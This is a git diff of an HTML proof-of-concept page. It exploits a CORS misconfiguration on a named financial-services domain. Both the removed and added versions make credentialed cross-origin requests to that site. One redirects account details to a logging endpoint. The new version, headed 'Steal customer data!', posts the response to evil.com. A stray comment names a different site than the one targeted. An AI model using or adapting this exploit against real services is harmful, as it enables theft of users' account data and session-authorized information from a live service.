@@ -1,26 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>My Website</title>
-  </head>
-  <body>
-    <main>
-        <h1>Welcome to My Website</h1>  
-        <p>This is my new website which is to test security</p>
-    <script>
-   var req = new XMLHttpRequest();
-   req.onload = reqListener;
-   req.open('get','https://feonline.fecredit.com.vn/accountDetails',true);
-   req.withCredentials = true;
-   req.send();
-
-   function reqListener() {
-       location='/log?key='+this.responseText;
-   };
-    </script>
-    </main>
-  </body>
+<html>
+<body>
+<center>
+<h3>Steal customer data!</h3>
+<html>
+<body>
+<button type='button' onclick='cors()'>Exploit</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from niche.co about user account
+document.getElementById("demo").innerHTML = a;
+xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send("data="+a);
+}
+};
+xhttp.open("GET", "https://feonline.fecredit.com.vn/wp-json/", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
 </html>
